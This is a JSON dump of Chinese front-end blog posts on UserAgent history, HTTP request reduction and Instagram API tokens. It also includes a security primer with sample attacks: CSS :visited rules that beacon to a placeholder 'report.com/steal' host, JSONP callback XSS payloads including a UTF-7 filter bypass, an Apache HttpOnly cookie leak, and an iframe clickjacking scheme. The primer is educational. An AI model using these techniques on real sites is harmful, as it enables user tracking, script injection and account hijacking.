End.","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"js","slug":"js","permalink":"http://ipcreator.me/tags/js/"}]},{"title":"转：\"浏览器野史 UserAgent列传（下）\"","date":"2014-10-05T09:26:00.000Z","path":"2014/10/05/zh-history-of-browser-useragent2/","text":"前篇《浏览器野史 UserAgent列传（上）》 六、师夷长技前面说到，微软靠Windows系统捆绑IE销售。而Windows自然也有它的对手，Linux。一个技术快速发展的时代，系统的世界里也是战火纷飞。Linux系统自从有了可视化界面，也需要浏览器呀。桌面系统KDE的缔造者们就发明了一个。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？但大神就是大神，大神就是讲究先从文字上占据压垮你的气势。先有Navigator航海家，再有Explorer探索者，咱就叫Konqueror(Conqueror的变体)征服者吧。行行行。我已懒得理这帮大神… 可是，问题来了。Konqueror使用KHTML排版引擎，即使它们认为自己跟Gecko引擎一样优秀，但用户不买单。你UserAgent里没有“Gecko”字样，我就不给你经过优良排版的html。结果，Konqueror思来想去，做了一个艰难但很萌的决定，把UserAgent写成Mozilla/5.0 (compatible; Konqueror/3.2; FreeBSD) (KHTML, like Gecko)…这就是现代浏览器里like Gecko这一萌词的由来。 就这样，伟大的排版引擎KHTML为了获得更好的资源，师夷长技。这并没什么不好，却造成了UserAgent的越发混乱。KHTML与Gecko这一对，永远卿卿我我比翼双飞在UserAgent里面了。那个满含深意的“like”，有人觉得翻译成“像”，但也有人觉得应该是“喜欢”… 七、世界大战首先是IE冷静下来了，他觉得，你们不带这么玩的？就我年少时不懂事，首先改了个Mozilla字样，后面追究这历史我岂不是成了罪魁祸首？我改还不行吗？在IE6，它明确自己UserAgent为Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)。除去已经注定不可抹去的“Mozilla”字样，其余信息简洁，准确，清晰。 但事态已经不可收拾。 Opera给这狂躁的世界添了一把火。它觉得，易容术非常炫酷呀。Opera直接在菜单提供了Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.51，Mozilla/5.0 (Windows NT 6.0; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51，Opera/9.51 (Windows NT 5.1; U; en)三个选择项。第一个是易容成IE，第二个是易容成火狐，第三个才是自己，选谁就是谁！ 其实这并不是一件坏事。因为Opera是站在能够让用户通过选择，去获得更好的浏览体验的基础上的。你提供选择，或是不提供，混乱的UserAgent还是在这，不离，不弃。再者，这对网页的开发者有极大的好处，在某些情况，你不必同时打开几个不同的浏览器去调试。到目前，最新的Chrome浏览器更加炫酷，能够支持近40种不同的UserAgent，甚至你还可以自定义。当然这是后话。 与此同时，苹果公司依靠内核WebKit，开发出Safari，命名UserAgent为Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.5。 有人就会问了，不是Webkit内核吗，怎么还有KHTML, like Gecko？注意，内核Webkit包含了一个排版引擎叫WebCore，而WebCore是KHTML衍生而来的。也就是说，WebCore是KHTML的儿子，子承父业，基因差不多。为了能够正常排版，safari只能这么写。 后来，google也开发了自己的浏览器Chrome，其内核也是Webkit，但它设定UserAgent为Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13。Safari一看，不对劲啊！你怎么也在后面写有Safari？Chrome呵呵一笑，你懂的。 因此，请让我一口气说完下面这一段：Chrome希望能得到为Safari编写的网页，于是决定装成Safari，Safari使用了WebKit渲染引擎，而WebKit呢又伪装自己是KHTML，KHTML呢又是伪装成Gecko的。同时所有的浏览器又都宣称自己是Mozilla。 这就是整个UserAgent世界大战的格局… 八、军阀混战将目光聚焦到国内，更是狼烟四起，混乱不堪。大家都知道，浏览器是互联网的入口，这块肥肉谁也不想丢。因而一个接一个的“国产”浏览器进入斗兽场。360，百度，QQ，UC，搜狗，猎豹，遨游，世界之窗…你能说出一大堆。连淘宝，酷狗，hao123都有浏览器，不信你搜。注意我前面“国产”两个字必须加上双引号，因为这个made in china并不纯。国人并没能像远古大神一样，硬生生发明一个内核出来，我们更擅长“微创新”。 利用Trident（IE的内核），包装一下皮肤，美化一下，就可以说：完美兼容利用Webkit，包装一下皮肤，美化一下，就可以说：极速浏览把两个内核都包起来，就可以说：智能双核 是微创新！读书人的事，能叫偷吗？ 在这插播一下，浏览器的“双核”，并不是你听说手机双核电脑双核那回事。再多个核，速度也不会更快，当然这么说，会显得很厉害的样子。德艺双馨，智勇双全，名利双收，才貌双绝，夫妻双双把家还，你看带“双”字的词都很牛的。 但我上面的叙述，的确有夸张的成分。浏览器的诞生，肯定不仅仅是包一下皮肤那么简单，国内的工程师们，也苦心研究做了许多工作。如果要说优化策略，我可以再写一篇超级长的文章。优化无止境，路漫漫其修远，向同行们致敬。只是我非常讨厌那些不把事实说清楚，纯粹靠文案去忽悠人的产品… 话说回来，这么多国产浏览器，总得靠不同UserAgent标志自己呀。大家自动分为两个阵营：使用Trident内核的，在IE已有UserAgent后添加自己的名称；使用Webkit内核的，就在Chrome的UserAgent后面添加。 前者像QQ浏览器：Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.7.26717.400)。后者像猎豹：Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36 LBBROWSER。当然双核浏览器诚然就是墙头草，切换内核时UserAgent也需要跟着变化。 如此的混战格局，这厢的IE和Chome想必也是醉了。 九、国共内战适者生存是不变的生存法则，国产浏览器们经过一段时间的用户筛选，自然优胜劣汰。时值2010年，真正还在运营和更新的浏览器数量慢慢下降，用户集中在几家表现更优异的厂商手中。就在这时，好看的故事来了——3Q大战爆发。 有人说，腾讯电脑管家的推出是导火索。其实这场仗，大家都忍了好久，推不推出，都一定会在某个事件后爆发。360浏览器是奇虎的重量级产品，用户量众多，2009年它推出一个功能：过滤其它网站的广告。诚然民众们都很喜欢。可是其他互联网公司肯定就不乐意了，用户看不到更点击不到广告，这钱还怎么赚？ 因而在3Q大战爆发后，腾讯的一个手段就是：如果你使用360浏览器，就不能访问QQ的网站（单单QQ空间就有巨大的用户量），也直接反攻360的最大收入来源。一个艰难的决定背后，往往是需要无数种的技术战略支撑的。企鹅判断用户是否使用360浏览器，依靠的就是UserAgent里是否有“360SE”的字样。 战报传来：号外，360浏览器上不了QQ空间！已经买了黄钻的杀马特贵族急了呀！只能换浏览器了呀！感覺侢乜卟哙噯嘞呀！2011年11月3日，腾讯网站封杀360浏览器2011年11月4日，360浏览器访问量仅为昨日一半2011年11月5日，360浏览器访问量几乎为0 有人说，腾讯就这么快赢了？恰恰相反，360浏览器通过一次强制的自动升级，又可以访问QQ的网站了。360的工程师们在5日使用了伪装术——把“360SE”字样从UserAgent中去掉！意思就是，360浏览器的UserAgent跟IE完全一样，你根本判断不出来（因而访问量为0）。就怕流氓有文化！企鹅傻眼了，总不能把大微软的IE也一并给禁了吧… 这场土匪遇恶霸的耍流氓大战，最终通过法律而化解。企鹅在技术侧拿360没办法，而360则得到了一个跟IE一样的身份证。在这场内战中，受伤的除了广大网民们，其实还有令人心疼UserAgent君，以往让它越长越长就算了，这次长了还得阉割掉，真心dan疼呀。 十、明日边缘看到这里，大家会明白一个道理：如果未来不出现一款霸主级别的浏览器（或内核），UserAgent应该不会有大变化了。不过，这道理并不全对。别忘了，移动侧也是有浏览器的。在早期能上网的手机里，内置了各手机厂商自研的浏览器。这些浏览器并不需要像PC一样的复杂设计，可以访问wap网页就足够了。因而它们的UserAgent命名，怎么简单怎么来，就直接叫诺基亚 3100 Nokia3100/06.01 (UCWEB 3.3B)，PHILIPS755 ObigoInternetBrowser/2.0 这样，有甚者连浏览器叫什么都不带 TCL-3199，三星 E618 SEC-SGHE618。 这样任由发展下去，一种要历史重演，往日重现的即视感压迫而来。web世界的联合国——W3C组织，站在明日边缘，面对着历史和未来，终于发话，它制定UserAgent标准，以后都得按这规范去起名字。详细请阅User Agent Accessibility Guidelines。至此，命运坎坷的UserAgent终于逐步走向规范。W3C大法好，有人说你怎么不早点来拯救世界呀！其实W3C一直在努力，但规范的制定，到推广至大家认可并执行，是一条漫长的道路，需要时间，也需要实践。W3C组织，在制定web标准这件工作之外，再我看来，还有两个身份：1、和事佬；2、背黑锅。和事不成，就得背黑锅。是的就是这样。 彩蛋那么，我们的故事接近尾声。还有一些有趣的小彩蛋。 Chome 28开始，与苹果正式分道扬镳，采用Blink内核，但它的UserAgent并不改变。 淘宝封杀微信打开淘宝页面，靠的就是微信内置浏览器UserAgent里的MicroMessenger字样。其实微信也可以像当初360一样把UserAgent去掉，但微信并不这样做。 360出招之时留有后招。也许，它一开始就想到了腾讯会告他们对于UserAgent的欺瞒，因而它其实提供了设置项。默认设置是“保持跟IE一样的UserAgent”，但用户也可以不勾选。只是这选项比较隐蔽，而且你重启浏览器后…又会变回默认设置。如果没有这个小小的设置，结果大家可以自行想象。 微软又玩新花样了，在泄露版IE 11中，去掉了以往的MSIE字样。初步猜测此举是为了使现有的 CSS hack 失效，避免过去网页设计师对IE差别对待的情况再度发生。但又会引发其他问题啊亲。 End.Litten 2014.10.5","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"web","slug":"web","permalink":"http://ipcreator.me/tags/web/"},{"name":"浏览器","slug":"浏览器","permalink":"http://ipcreator.me/tags/浏览器/"}]},{"title":"转：\"浏览器野史 UserAgent列传（上）\"","date":"2014-09-26T03:26:00.000Z","path":"2014/09/26/zh-history-of-browser-useragent/","text":"某天，我做一个小项目，需要判断一下浏览器类型。简单的呀。控制台敲下：navigator.userAgent浏览器回应：Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 天，这串是啥？你怎么连话都说不清楚？ 我对userAgent并不陌生，但明明一个单词就可以说清楚的事情，却是这么掏心掏肺的回答。怪可怜的，一定有冤情。 后来我查阅了很多资料，发现历史非常的精彩。 大事年表 1990年: Nexus(WorldWideWeb)诞生 1993年1月23日：Mosaic诞生 1994年12月：Netscape(Mozilla)诞生 1995年4月：Opera诞生 1995年8月16日：Internet Explorer诞生 2002年9月23日：Firefox诞生 2003年1月7日：Safari诞生 2008年9月2日：Chrome诞生 一、盘古开天地很久很久之前，上古大神Berners-Lee发明了WorldWideWeb，即万维网。同时，李大神也发明了第一款浏览器。真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？但大神就是大神，大神内心的想法又岂是尔等凡人能够肆意揣摩？ 万万没想到，李大神说，我这浏览器，也叫WorldWideWeb！不行么？行行行。 虽然李大神起名字这么拽，但他后来发觉，还是得赋予一点承上启下的历史意义，就改名成“Nexus”。值得注意的是，这浏览器，居然是可以兼容Unix跟Microsoft DOS的。它在当时流行的各种电脑上跑得飞起，应用也越来越广，被称为“杀手级应用”。杀手级…你们看互联网一开始就是这么的腥风血雨。 但这个浏览器，还不支持图片的显示，这是出现UserAgent的导火索。 二、唐尧虞舜93年，伊利诺大学的NCSA组织认为，浏览器无图无真相，这不好。因而他们发明了第一款可显示图片的浏览器。真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？但大神就是大神，大神就是连起名字都让你惊心动魄。 NCSA组织说，它能显示图片，偏偏我们就要叫它“马赛克(Mosaic)”！不行么？行行行。 但有人就问了，Nexus不显示图片，Mosaic能显示，你们让html提供者怎么写代码？你们是不是想逼死选择困难症患者？有没有考虑过天秤座的感受？ 因而UserAgent就诞生了。Mosaic将自己标志为NCSA_Mosaic/2.0 (Windows 3.1)，大家该怎么写代码就怎么写，但请求会带上这个信息，服务器就知道该不该返回能显示图片的html。UserAgent君，出生时跟我们设想的一样简单，仅仅标明了自己是什么浏览器，在什么系统运行，以及各自的版本号。 新旧浏览器们像彬彬有礼的君王，商议和让位是为了更好的繁荣。但风雨欲来。 三、楚汉争霸像刘邦一样，走出来一个搅局的小流氓。当然他还是很有志向的，他的目标，就是战胜霸主Mosaic。后来，他还真的做到了。如今，所有现代浏览器的UserAgent里都有它的标志，就像汉朝之后，我们都称为“汉”人。一群很有天赋的程序员，一起缔造了它的辉煌。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？但大神就是大神，大神就是让你永远也猜不到他们想了个什么名字。大神们说，叫Mozilla，不行么？行。但什么意思呢？ 含义有二。其一，哥斯拉(Godzilla)谐音，诚然是一头野心勃勃的怪兽；其二，”Mosaic Killa”之意，Killa是俚语中Killer的拼法，即“马赛克的终结者”，赤裸裸的挑战。 惊呆了的Mosaic小心翼翼的念着Mozilla这发音：“Mo…摸咋了？”勃然大怒，“摸你妹！” 鉴于Mosaic当时的权势，Mozilla改名成Netscape Navigator(网景航海家)。小怪兽突然变成有点文艺小清新的名字，郁闷得很，但内心的血液沸腾着。虽然叫大名叫网景，但它把UserAgent偷偷设置成Mozilla/1.0 (Win3.1)。还是摸咋了？咬我？ 四、宋元之战很快，NetScape战胜了Mosaic，成为了新的霸主，因为其更优的展示。NetScape最先支持了html框架显示，就是简单的table布局，内外边距之类，仅仅这点就将Mosaic抛诸身后。区别这两个浏览器，还是用的UserAgent。如果是UserAgent里含有“Mozilla”字样，那就发送支持框架的页面，否则，就发送不含框架的页面。 NetScape帝国日益庞大，歌舞升平，一切风平浪静，直到微软的铁骑挥军南下。 微软发布了一款跟系统强绑定的浏览器，真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？不用想了，就是IE。这命名也相当简单粗暴，Internet Explorer，直接把这工具的用途拍在你脸上。连说明书都可以免了。 IE也是支持html标准框架的，但由于前面的历史原因，人们只会给UserAgent里含有“Mozilla”字样的浏览器发送含框架的页面。但这点小事能难倒我大微软？IE呵呵一笑，把自己的UserAgent改成Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)。看，我这里也有“Mozilla”字样，也能收到含框架的页面了！ 当然，这个小流氓行为，跟后来把IE和Windows捆绑一起销售的大流氓行为比起来，根本不为足道。后面的故事我们也知道了，IE把NetScape干掉了。但它的身体上，却永远的烙上了“Mozilla”的印记。 五、康乾盛世看过奥特曼的都知道，怪兽被打败了会再回来。别忘了NetScape曾拥有一批大神们，失败后，他们围绕着浏览器排版引擎Gecko(壁虎)成立了非正式组织Mozilla。小怪兽再次出发。大神们发明了另一款优秀的浏览器，它在插件拓展和开发调试领域做出的贡献，绝对可以载入互联网历史。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？但大神就是大神，大神就是即使你知道了Mozilla的命名都是野兽，却还是猜不到是什么。Mozilla说，我们浴火重生，叫Phoenix(凤凰)！不行么？真不行。 刚推出就被人告了，原来已经有一家公司叫做“凤凰科技”。Mozilla瀑布汗，改名叫Firebird(火鸟)！还不行么？我们得原谅一下他们的取名，虽然现在看来满满的山寨感，可放在那个时代，Firebird这名字很炫酷。就像你当初的QQ昵称叫赤炎天使感觉依然良好一样。 但是，他们发现，业内有个数据库系统，也叫的Firebird…泪流满面的Mozilla感慨重生好难呀。最后才决定叫Firefox(火狐)。 基于Gecko引擎的Firefox非常优秀，为了告诉大家，我使用了这个引擎，它标志自己的UserAgent为Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.7.5) Gecko/20041108 Firefox/1.0。这时候的UserAgent，虽然长了点，但它并不混乱，准确的标明了系统，排版引擎，浏览器名称等信息。虽然IE这时已经占有了很大的市场份额，但基本停步不前；而Mozilla经过一段时间的修生养息，Firefox在业内广受好评，得到了快速的发展。 时值2003年，web2.0的浪潮前夕，浏览器的发展达到了空前的盛世。然而所谓否极泰来，盛极则衰。涅槃的Firefox迎来盛世，却又恰恰由于盛世，决定了UserAgent纠结的命运。 《浏览器野史 UserAgent列传（下）》 To Be Continue.litten 2014.9.28","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"web","slug":"web","permalink":"http://ipcreator.me/tags/web/"},{"name":"浏览器","slug":"浏览器","permalink":"http://ipcreator.me/tags/浏览器/"}]},{"title":"转：\"再议减少HTTP请求\"","date":"2014-08-14T05:10:00.000Z","path":"2014/08/14/zh-reduce-http-requests/","text":"最近参加了IMWEB前端技术沙龙活动，有幸能站到讲台上，将性能方面的经验与大家分享。现将“再议减少HTTP请求”部分简单摘剪成文。 前言:关于web性能，有两个著名论断： 0.1-0.2s 用户认为是即时的；1-5s 用户觉得自己能与信息流畅地交互；5-10s 用户开始转移注意力——Robert Miller 用户所接受的数据，有80~90%的时间都耗在前端上——Steve Souders 前者说明，loading图（以下简称菊花）是必要的。人处于“开始转移注意力”时，这朵菊花就开始挽留你躁动的心。但web工程师的一个使命，就是通过提升性能，不让用户看到菊花。菊花要有，但不能常有，真是一朵磨人的小妖精… 后者说明，资源的加载和渲染可以大做文章。因为一个html文件，几乎是所有资源的承载器，哪些优先加载，怎样加载，都是前端工程师可以控制的。 再议减少HTTP请求：“尽量减少HTTP请求，减少DNS查找”这是Yslow写在最前面的两条规则。而放之实际，可能会遇到挑战。为何？因为我们完成了“降低请求数”的目标，但可能损失了其他方面的指标。 a. 没有浏览器缓存减少HTTP请求，很常用的做法就是把js和css资源inline到html里。这样的做法，自然没有浏览器缓存，重复加载时连静态资源也必须加载。也许有人又说，我可以把整个html文件都缓存啊！的确可以，但以web开发的更新速度，html文件一般都不设或设置很短时间（5 min?）缓存。另外在web2.0时代里，html缓存会带来不必要的问题。比如登录前后，页面资源展示不一样，那么我们就得慎用html缓存。 b. 没有cdn缓存这个很好理解，任何的内联资源，由于依赖于html，都必须从源服务器而不是cdn服务器返回。 c. 不能按需加载为了按需加载，前端工程师可谓想法各异，天马行空。比如图片的lazyload技术，异步加载js脚本，而inline的方式恰恰将一切想法摁回脑中。 d. 浏览器预解析DNS失效现代浏览器有预解析DNS技术。简单来说，就是页面下载到浏览器时，先扫描一遍，在这时发现域名并预解析DNS。这样的前置解析跟dom渲染等操作同步执行，诚然会使浏览器更快。但如果你的html页面因为内联了太多内容（base64图片），大于5M时，浏览器的预解析DNS将会失效。 最佳实践因而，我们时常像那只捡芝麻丢西瓜的熊。如此平衡这两者呢，业界给我们两个很好的案例。 Demo1 必应 首次内联CSS与JS 将资源取出，并保存在localStorage中 资源名（版本）保存在cookie中 后续请求中，服务器检查对应的cookie 根据cookie的值，只嵌入新的脚本 加载时，从localStorage里载入资源 Demo2 百度(移动端) 首次将静态资源打包，用jsonp统一返回 将资源解析并保存在localStorage中 再次访问时检查localStorage中资源情况 如有缺失再发请求获取资源 必应的做法确保了首次的http请求最少，后续充分发挥增量更新（当然粒度还是文件）的优势提高性能，但缺点是cookie并不可靠。百度则是把首次静态资源的http请求降低到一次，非常暴力的把全部css，js打包成字符串，以jsonp返回。宁愿用str转obj的解析时间去换取加载时间。而随V8引擎的强大，这点解析的时间也将越来越不值得提起。总而言之，这两个Demo都把http请求尽可能的降低，而后都利用了本地存储去获得资源。 我有时候会想起那把由无名的铁匠用三个小时粗制而成的小李飞刀。你得对技术怀敬畏之心。因为那些谁都懂的技术，在某些人的手里，还真能变出花儿来。","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"html5","slug":"html5","permalink":"http://ipcreator.me/tags/html5/"},{"name":"前端","slug":"前端","permalink":"http://ipcreator.me/tags/前端/"},{"name":"性能","slug":"性能","permalink":"http://ipcreator.me/tags/性能/"}]},{"title":"转：\"前端安全冷门知识杂谈\"","date":"2014-05-27T15:52:00.000Z","path":"2014/05/27/zh-safety-point-of-view-from-front-end/","text":"###零、概述提起web前端安全，大家都会想到两个名词：xss和csrf。抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。大概分为以下章节： 盗取无法用js读写的Cookie删不掉的本地存储函数覆写监听上报内存Cookie与硬盘CookieCSS带来的点击量泄露JSONP回调函数与UTF-7编码过滤与代码混淆心理学与社会工程学 资料略多，文章较长，请自备瓜子… ###一、盗取无法用js读写的Cookie为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。12setcookie(\"test\", 1, time()+3600, \"\", \"\", 0); // 设置普通Cookiesetcookie(\"test_http\", 1, time()+3600, \"\", \"\", 0, 1);// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启 我们还是可以通过一些服务器上的漏洞去获取它们。 ####2.1) 调试信息泄露比较经典的是PHP的phpinfo文件：如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括HttpOnly Cookie。访问phpinfo.php，将看到：其他的服务器，如python的Django，也有类似的调试信息文件，在外发时要注意清除。 ####2.2) Apache 2.2.x版本请求头超长泄露Cookies最大限制一般为4kb左右，如果请求头长度超过LimitRequestFieldSize，将会引发400错误。在Apache 2.2.x多个版本内，如果引发400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了HttpOnly Cookie。因此，我们可以利用这个漏洞，构造一个超长的请求，让Apache返回400，并用ajax捕获xhr.responseText即可获得HttpOnly Cookie信息。 ###三、删不掉的本地存储如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且”永久”寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案： Cookie - 是最常见的方式，key-value 模式UserData - IE自己的本地存储，key-value 模式localStorage - HTML5 新增的本地存储，key-value 模式local Database - HTML5 新增的浏览器本地DataBase，是SQLite 数据库Flash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器 除去这些，我还收集了一些比较“偏门”的存储方案： Silverlight的IsolatedStorage - 类似HTML5 localStoragePNG Cache，将Cookie 转换成RGB 值描述形式，以PNG Cache 方式强制缓存着，读入则以HTML5 的canvas 对象读取并还原为原来的Cookie 值HTTP Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容Web History，利用的是“CSS 判断目标URL 是否访问过”技巧，比如a标签访问过会显示紫色（新浏览器已fix）window.name，本质就是一个DOM 存储，并不存在本地。 老外Samy Kamkar用半天开发了一个JavaScript API：evercookie。该API利用了上面的全部存储手段，将“永不丢失你的cookie”贯彻到底…当evercookie发现用某种机制存储的cookie被数据将删除之后，它将利用其它机制创建的cookie数据来重新创建，让用户几乎不可能删除cookie。 ###四、函数覆写监听上报覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：搞跨站的人总习惯用alert来确认是否已成功跨站，如果你要监控是否有人在测试你的网站xss的话，可以在你要监控的页面里覆写alert函数，记录alert调用情况。12345678910function log(s) &#123; var img = new Image(); img.src = \"http://yousite.com/log.php?caller=\" + encodeURIComponent(s);&#125;var _alert = alert;window.alert = function(s) &#123; log(alert.caller); _alert(s);&#125; 如此，就能在有人调用alert时，就执行上报，以供监控。好吧，这里还涉及人的心理学…其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：《浅谈javascript函数劫持》。 ###五、内存Cookie与硬盘Cookie内存Cookie - 指没有设置过期时间Expires的Cookie，随浏览器关闭，此Cookie在内存中销毁硬盘Cookie - 设置了过期事件Expires的Cookie，常驻硬盘，直到过期 我们很容易得出结论：内存Cookie更安全。因此，某些站点会把敏感信息放到内存Cookie里面。这原本是没什么风险的，但恰巧会在遇到XSS的时候失控。试想下，XSS攻击者可以给内存Cookie加一个过期时间，使其变为硬盘Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。 因此，这里有两个关注点： 敏感信息还是不要放Cookie里，即使是内存Cookie； 服务器要做Cookie的三个维度的校验 - 唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。 ###六、CSS带来的点击量泄露在我们的印象中，前端安全基本是js带来的问题，但css也会有安全隐患吗？是的。除去IE下的css中执行js代码问题，还有另外一个关注点。假如有一个开源组件，我们只看了下js源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的css的…但有某种极端的情况，css带来了意想不到的数据泄露。试想这是一个导航栏组件，html代码是这样的：123&lt;a href=\"http://yousite.com/a1\" id=\"a1\"&gt;nav1&lt;/a&gt;&lt;a href=\"http://yousite.com/a2\" id=\"a2\"&gt;nav2&lt;/a&gt;&lt;a href=\"http://yousite.com/a3\" id=\"a3\"&gt;nav3&lt;/a&gt; 你忽略掉的css写成这样：123#a1:visited &#123;background: url(http://report.com/steal?data=a1);&#125;#a2:visited &#123;background: url(http://report.com/steal?data=a2);&#125;#a3:visited &#123;background: url(http://report.com/steal?data=a3);&#125; 我们用到业务里，用户点击这三个导航后，a标签的visited伪属性生效，就会设置background，而背景的url其实是上报地址。这时候，你的业务的点击数据量就暴露给第三方了！当然，这只针对旧版本浏览器，新版本浏览器都已fix这个问题。可是，HTML5的出现又让这个问题回归了…HTML5提供伪类::selection，当指定对象区域被选择时，就会触发。其原理跟上面类似。 ###七、JSONP回调函数与UTF-7编码 ####7.1) 基本原理在JSONP技术中，服务器通常会让请求方在请求参数中提供callback 函数名，而不是由数据提供方定制，如请求方发起请求：cgi-bin/get_jsonp?id=123&amp;call_back=some_function返回数据格式为：some_function([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);如果，数据提供方没有对callback函数名做安全过滤，就会带来XSS问题。请求：cgi-bin/get_jsonp?id=123&amp;call_back=&lt;script&gt;alert(1);&lt;/script&gt;返回：&lt;script&gt;alert(1);&lt;/script&gt;([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);所以，一般服务器都会对call_back参数进行过滤，但过滤的方法是否会存在漏洞呢？ ####7.2) IE解析UTF-7漏洞比较简单的过滤方法，是过滤&lt;&gt;字符，使得无法构成html标签。但在IE6\\IE7的某些版本中，存在以下漏洞：如果发现文件前面是“+/v8”开头，就把文件当做UTF-7解析（IE7后续版本已发布补丁修复）。在没被修复的IE版本中，如果我们将上面的请求用utf-7编码。再在前面加上”+/v8”头：cgi-bin/get_jsonp?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4这时候巧妙的躲开了&lt;&gt;过滤，而返回：+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4({‘id’=&gt;123,data=&gt;’some_data’});这时IE将这个jsonp文件当作utf-7解析，依然触发XSS。 ###八、过滤与代码混淆过滤器如果过滤了大部分的js函数，如eval、alert之类，是否就能保证安全呢？必然不是，我们还有强大的js代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：jsfuck。站名如其名，满满的恶意…它可以仅仅用6个字符：[]()!+去混淆编码js。而且兼容性特别的完善。以下是我在最新chrome下的截图，将一句alert(1)编码成了3009个字符，并执行成功：所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。 ###九、心理学与社会工程学有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例： ####9.1）诱导触发拖拽事件比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？很简单，添加一张图片：注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。 ####9.2) 传说中的QQ空间“传染病毒”步骤是这样的： A(始作俑者)发布了一条说说：这个网站很好玩，快来试试吧~ http://xxx.xxx A的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面 好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！） 一传十十传百，越传越广… 但真实的情况跟CSRF没一点关系。玄妙在于：好友们打开链接后干了什么事情？这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说… 有人会问，这不是CSRF吗？还真不是。做法却很简单：“有趣”的网站内嵌了一个iframe，iframe加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这iframe的透明度变为0。所以用户点击小球，其实是点击了iframe中的转发按钮。真是令人万万没想到。 以上。End. 5.27 by litten.","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"web","slug":"web","permalink":"http://ipcreator.me/tags/web/"}]},{"title":"转：\"instagram图片拉取小经验\"","date":"2014-03-03T14:52:00.000Z","path":"2014/03/03/zh-instagram-api-ex/","text":"最近喜欢上了instagram，分享一下获取照片的经验。 ###一、三“步”曲instagram开放了API，授权遵循Oauth2.0协议。 ####1、注册client id到管理客户端页面，选择“注册新客户端”。这时会提示你填手机号，接着会收到短信验证码。经过验证，就到达了下面的界面：按照字面意思填写完毕，client id就注册完毕了。 ####2、用client_id去换取token在浏览器中请求：1https://instagram.com/oauth/authorize/?client_id=&#123;CLIENT_ID&#125;&amp;redirect_uri=&#123;REDIRECT_URI&#125;&amp;response_type=token 花括号里面的值，对应上一步最终得到的client_id和自己设定的redirect_uri。请求到的是一个授权页面，授权完毕后，则重定向到你的redirect_uri。注意看授权成功后的url，hash部分会附带给你的token。至此，token成功获取。 ####3、用token去调用API 拿到token，就等于拿到仓库的钥匙了！赶紧试着用token调用api查看自己的图片吧：1https://api.instagram.com/v1/users/&#123;USER_ID&#125;/media/recent/?access_token=&#123;TOKEN&#125; 这时，你会发现似乎…被instagram api坑了一道。user_id是个啥？机智如我，果断填上了自己的用户名。结果错了。 